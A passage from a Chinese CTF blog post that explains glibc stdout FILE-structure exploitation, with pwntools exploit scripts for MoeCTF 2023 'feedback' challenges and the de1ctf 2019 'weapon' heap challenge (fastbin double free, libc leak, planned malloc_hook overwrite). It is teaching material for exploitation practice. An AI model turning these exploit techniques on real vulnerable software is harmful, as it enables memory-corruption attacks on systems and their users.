class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./feedback2&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;a gift: &#x27;</span>)</span><br><span class="line">heap_addr = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">log.success(<span class="string">&quot;gitf: &quot;</span>+heap_addr)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(heap_addr,<span class="number">16</span>)</span><br><span class="line"><span class="comment"># offset_feedback_stdout:-8</span></span><br><span class="line">flag = <span class="number">0xFBAD1800</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Which list do you want to write?\n&#x27;</span>,<span class="string">b&#x27;-8&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>现在先来确定一下<code>flag</code>的位置，其实<code>flag</code>的起始地址就是<code>gift</code>发送过来的地址</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723173046078.png" alt="image-20250723173046078"></p><ul><li>那么我们其实可以设置<code>_IO_write_base = buf</code>，而<code>_IO_write_ptr = buf+len(flag)</code>至少要设置到这么多，之后<code>_IO_write_end = buf + 0x50</code>，注意<strong>一般输出逻辑是将从base输出到ptr</strong>，而不是从base输出到end。</li><li>并且需要满足<code>base &lt;= ptr &lt;=end </code>否则输出的时候会有很多问题。所以接下来进行如下<code>stdout</code>修改</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(flag)     <span class="comment"># _flag </span></span><br><span class="line">payload+= p64(<span class="number">0</span>)        <span class="comment"># _IO_read_ptr</span></span><br><span class="line">payload+= p64(<span class="number">0</span>)        <span class="comment"># _IO_read_end</span></span><br><span class="line">payload+= p64(<span class="number">0</span>)        <span class="comment"># _IO_read_base</span></span><br><span class="line">payload+= p64(heap_addr)  <span class="comment"># _IO_write_base</span></span><br><span class="line">payload+= p64(heap_addr+<span class="number">0x30</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">payload+= p64(heap_addr+<span class="number">0x50</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723173911192.png" alt="image-20250723173911192"></p><ul><li>修改后，在调用<code>puts(&quot;Which list do you want to write?&quot;);</code>的是就会将<code>flag</code>打印出来</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723174116603.png" alt="image-20250723174116603"></p><h2 id="题目1_exp">题目1_exp</h2><ul><li>最终的<code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./feedback2&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;a gift: &#x27;</span>)</span><br><span class="line">heap_addr = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">log.success(<span class="string">&quot;gitf: &quot;</span>+heap_addr)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(heap_addr,<span class="number">16</span>)</span><br><span class="line"><span class="comment"># offset_feedback_stdout:-8</span></span><br><span class="line">flag = <span class="number">0xFBAD1800</span> <span class="comment"># _flag</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Which list do you want to write?\n&#x27;</span>,<span class="string">b&#x27;-8&#x27;</span>)</span><br><span class="line">payload = p64(flag)     <span class="comment"># _flag </span></span><br><span class="line">payload+= p64(<span class="number">0</span>)        <span class="comment"># _IO_read_ptr</span></span><br><span class="line">payload+= p64(<span class="number">0</span>)        <span class="comment"># _IO_read_end</span></span><br><span class="line">payload+= p64(<span class="number">0</span>)        <span class="comment"># _IO_read_base</span></span><br><span class="line">payload+= p64(heap_addr)  <span class="comment"># _IO_write_base</span></span><br><span class="line">payload+= p64(heap_addr+<span class="number">0x30</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">payload+= p64(heap_addr+<span class="number">0x50</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="题目2_moectf_2023-feedback原">题目2_MoeCTF_2023 feedback(原)</h1><ul><li>接下来直接使用<code>Docker</code>文件，在glibc<code>2.31</code>分析一下原题。与修改的题相比，原题还需要先泄露一下<code>libc</code>的地址。</li></ul><h2 id="题目2_分析1">题目2_分析1</h2><ul><li>原题目的程序逻辑与题目1的程序逻辑差不多，主要就是<code>read_flag</code>这个地方，这个地方并不是将<code>flag</code>放到<code>malloc</code>申请的堆块中，而是放到<code>libc</code>中的某个位置，其他的都没什么变化</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723220025115.png" alt="image-20250723220025115"></p><h2 id="题目2_分析2">题目2_分析2</h2><ul><li>接下来就调试一下这个程序，调试前先查看一下题目附件看看程序保护机制如何，发现是保护全开的。</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723224643587.png" alt="image-20250723224643587"></p><ul><li>保护全开就导致了没有办法知道程序的基地址，而现在我们又不知道libc地址，所以一开始不知道<code>libc</code>的地址应该如何操作呢，接下来就动态调试一下。</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723224733193.png" alt="image-20250723224733193"></p><ul><li>在调试的过程中，其实可以发现<code>_IO_write_base</code>等一些列<code>IO</code>结构体成员其值其实为<code>0x7f50e8beb723 &lt;_IO_2_1_stdout_+131&gt;</code></li><li>并且<code>write</code>的顺序其实是<code>_IO_write_base</code>~<code>_IO_write_ptr</code>~<code>_IO_write_end</code>这样的一个顺序，所以溢出修改的时候其实也是按照这个修改顺序。</li><li>这样一来的话其实很好操作，溢出只<code>_IO_write_base</code>的最末尾一个字节，由于<code>_IO_write_ptr</code>指向的是<code>_IO_2_1_stdout_+131</code>，那么其实输出的时候就会将<code>0x7fxxxxxx00</code>到<code>0x7fxxxxxx723</code>之间的数据输出</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723224927792.png" alt="image-20250723224927792"></p><ul><li>这样一来其实就能利用<code>off-by</code>漏洞导致libc的地址泄露，记下来先进行泄露，泄露的其实是这样的</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723225357633.png" alt="image-20250723225357633"></p><ul><li>但是在调试的时候会发现，泄露的一个<code>0x7fxxx</code>的地址其实是<code>stdin</code>的地址</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723225551180.png" alt="image-20250723225551180"></p><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723225641201.png" alt="image-20250723225641201"></p><ul><li>这下就成功接收到了<code>stdin</code>的地址</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723230154124.png" alt="image-20250723230154124"></p><ul><li>这样其实就能确定<code>libc</code>的基地址，从而确定<code>puts</code>函数的地址。现在<code>puts</code>的地址已经有了直接就可以计算得到<code>flag</code>的地址</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc_base = stdin_addr + <span class="number">3600</span> - libc.symbols[<span class="string">&#x27;stdin&#x27;</span>] <span class="comment"># 注意libc.symbols[&#x27;stdin&#x27;]并不是stdin结构体实例的地址还需要计算一下偏移</span></span><br><span class="line">puts_addr = libc_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;stdin_offset:&quot;</span>+<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;stdin&#x27;</span>]))</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>得到<code>flag</code>的地址其实就可以继续修改<code>stdout</code>的结构体。实际上<code>flag</code>的真实地址与程序<code>read</code>的地址会有点偏差</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723231520620.png" alt="image-20250723231520620"></p><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723231529879.png" alt="image-20250723231529879"></p><ul><li>最后泄露出<code>flag</code></li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723231813579.png" alt="image-20250723231813579"></p><ul><li>打远程看看，打远程由于偏移的原因需要稍微的爆破才可以</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723233156925.png" alt="image-20250723233156925"></p><h2 id="题目2_exp">题目2_exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./feedback&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;ip&#x27;</span>,<span class="number">9005</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Which list do you want to write?\n&#x27;</span>,<span class="string">b&#x27;-8&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    flag = <span class="number">0xfbad1800</span></span><br><span class="line">    payload = p64(flag)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p8(<span class="number">0x00</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Then you can input your feedback.&#x27;</span>,payload)</span><br><span class="line">    pause()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        stdin_addr = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    log.success(<span class="string">&quot;stdin_addr:&quot;</span> + stdin_addr.<span class="built_in">hex</span>())</span><br><span class="line">    stdin_addr = u64(stdin_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.success(<span class="string">&quot;stdin_addr:&quot;</span> + <span class="built_in">hex</span>(stdin_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    libc_base = stdin_addr + <span class="number">3600</span> - libc.symbols[<span class="string">&#x27;stdin&#x27;</span>] <span class="comment"># 注意libc.symbols[&#x27;stdin&#x27;]并不是stdin结构体实例的地址还需要计算一下偏移</span></span><br><span class="line">    puts_addr = libc_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    flag_addr = puts_addr +  <span class="number">1495776</span> <span class="comment">#程序给的0x2DA5C,但是实际上并不是0x2da5c</span></span><br><span class="line">    log.info(<span class="string">&quot;stdin_offset:&quot;</span>+<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;stdin&#x27;</span>]))</span><br><span class="line">    log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    log.info(<span class="string">&quot;flag_addr:&quot;</span>+<span class="built_in">hex</span>(flag_addr))</span><br><span class="line">    payload = p64(flag)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(flag_addr)</span><br><span class="line">    payload += p64(flag_addr+<span class="number">0x60</span>)</span><br><span class="line">    payload += p64(flag_addr+<span class="number">0xa0</span>)</span><br><span class="line">    pause()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;-8&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive() <span class="comment"># 如果能到这一步，要多按几个回车输入几个换行符才会输出flag</span></span><br></pre></td></tr></table></figure><h1 id="题目3_de1ctf_2019_weapon">题目3_de1ctf_2019_weapon</h1><ul><li>该题在<code>buuctf</code>有<a href="https://buuoj.cn/challenges">BUUCTF在线评测</a>，可以去<code>buu</code>上打远程，这题就是与堆题结合了。</li><li>考点：<code>堆分水</code>、<code>unsorted_bin_attack</code>、<code>fast_bin_double_free</code>、<code>stdout泄露libc</code></li></ul><h2 id="题目3_分析1">题目3_分析1</h2><ul><li>先查看一下保护机制，发现保护全开</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250731220222648.png" alt="image-20250731220222648"></p><ul><li>然后再查看一下反编译的程序<code>main</code>函数如下，经典的堆菜单题目。</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250731220246169.png" alt="image-20250731220246169"></p><ul><li>恢复结构题和修改变量和函数名称后<code>add()</code>函数如下：<ul><li>输入要申请的堆块大小和存储堆块地址和大小的索引</li><li>然后往堆块中输入内容</li><li><strong>注意</strong>：这里有机会出现负索引</li></ul></li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250731222132797.png" alt="image-20250731222132797"></p><ul><li>再来看看<code>del()函数</code><ul><li>其实就是输入一个索引，释放索引中的堆块</li><li>但是这里释放后并没有将堆块的地址设置为<code>0</code>，所以存在<code>UAF</code>漏洞</li></ul></li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250731222302585.png" alt="image-20250731222302585"></p><ul><li>在查看一个<code>rename</code>相关功能：<ul><li>输入一个堆块索引，向堆块地址中写入内容</li><li>但是这里注意该索引其实<strong>可以是负索引</strong></li></ul></li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250731222513535.png" alt="image-20250731222513535"></p><h2 id="题目3_分析2">题目3_分析2</h2><ul><li><p>这题有一个与平时堆题比较不一样的地方就是没有<code>show</code>功能，所以泄露地址其实就没那么容易了。但是由于存在负索引，这就使得在调用<code>rename()</code>函数的时候可以修改到<code>stdout</code>结构体，这样就能泄露libc的地址了。</p></li><li><p>接下来先写一下程序的交互逻辑</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./de1ctf_2019_weapon&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.interactive()</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size of weapon:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;input index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;input your name:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;input idx :&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename</span>(<span class="params">index,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;input idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;new content:&#x27;</span>,context)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>这里先说一下大致思路：<ol><li>先利用<code>fastbin_double_free</code>修改堆块的<code>size</code>位，使得程序在<code>free()</code>被修改size位的堆块后能被放入<code>unsortedbin</code>（这样才有libc的地址）</li><li>之后使用<code>unsorted_bin_attack</code>修改<code>chunk-&gt;fd</code>为<code>main_arena+88</code>这个地址的值，这样通过偏移计算出<code>stdout</code>结构体的地址，修改<code>chunk-&gt;fd</code>的最低俩个字节，这样就可以申请到<code>stdout</code>结构体附近的地址，从而可以修改<code>stdout</code>结构体，这样就可以造成<code>libc</code>的泄露</li><li>最后再使用一次<code>fastbin_double_free</code>，劫持<code>malloc_hook</code>为<code>one_gadget</code>，这样其实就可以<code>getshell</code>了。</li></ol></li><li>接下来详细说明，先申请<code>5</code>个堆块，申请的大小依次为<code>0x50,0x50,0x60,0x50,0x50</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x50</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820180539562.png" alt="image-20250820180539562"></p><ul><li>接下来先修改一下<code>index=0</code>的堆块内容，这个<code>0x555555603050 </code>其实就是我们要申请的地址</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">9</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">rename(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820180652459.png" alt="image-20250820180652459"></p><ul><li>由于堆的低位偏移是不变的，所以此时利用<code>fastbin_double_free</code>的时候只需要修改<code>fd</code>的低位即可，下图就是<code>rename()</code>后的<code>fd</code>的值，这样使用<code>double_free</code>时就可以绕过<code>size</code>的检查成功申请到目标位置。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">rename(<span class="number">3</span>,p8(<span class="number">0x50</span>))</span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820181233136.png" alt="image-20250820181233136"></p><ul><li>申请到目标位置后就需要修改<code>index=1</code>这个堆块的<code>size</code>位（这里修改<code>size=0xd1</code>，刚好是<code>idx=1、idx=2</code>这俩个堆块的合并位置），这样就可以构造一个堆叠，并且很轻松的可以绕过检查。</li><li>构造完堆叠后，就可以将<code>idx=1</code>的堆块释放，此时该堆块就会被放入到<code>unsorted_bin</code>中，还需要将<code>idx=2</code>的堆块释放，这样<code>idx=2</code>的堆块就会被放入到<code>fastbin[0x70]</code>这个位置处</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x50</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820181811567.png" alt="image-20250820181811567"></p><ul><li>接下来就是写<code>main_arena+88</code>到<code>idx=2</code>这个堆块的<code>fd</code>指针，这个时候其实申请俩个<code>0x20</code>大小的堆块其实就可以将<code>main_arena+88</code>的位置写入到<code>fd</code>指针，因为申请的<code>0x20</code>大小的堆块<code>fastbin列表</code>是空的，所以会去<code>unsortedbin</code>切割。切割后就会出现下图的情况：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="number">9</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820182305585.png" alt="image-20250820182305585"></p><ul><li>有了libc地址后，现在就要查看一下<code>stdout</code>结构体的地址以及<code>main_arena+88</code>这个结构体：<ul><li>发现<code>stdout</code>的地址为<code> 0x7ffff7dd2620</code>，而<code>main_arena+88</code>的这个地址为<code>0x7ffff7dd1b78</code></li><li>如果开启随机地址偏移会发现倒数第二字节的高4位是存在随机偏移的，即stdout中<code>0x2620</code>中这个<code>2</code>是随机的，这里本地调试就关闭了随机地址偏移</li></ul></li></ul><p><img 